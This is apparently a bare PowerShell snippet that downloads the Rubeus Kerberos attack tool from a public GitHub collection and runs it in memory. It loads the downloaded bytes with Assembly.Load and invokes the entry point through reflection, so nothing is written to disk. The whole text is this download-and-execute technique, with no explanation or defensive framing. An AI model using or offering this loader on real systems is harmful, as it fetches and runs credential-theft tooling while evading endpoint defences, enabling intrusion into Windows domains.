$u = "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.0_Any/"
$f="Rubeus.exe"
$c = "1"
[byte[]] $a = (New-Object System.Net.WebClient).DownloadData($u+$f)
$assem = [System.Reflection.Assembly]::Load($a);
#$assem.CustomAttributes
#$assem.EntryPoint |ft Name, ReflectedType, Module, IsPublic
([Type]$assem.EntryPoint.DeclaringType.FullName.ToString())::([String]$assem.EntryPoint.Name).Invoke($c)
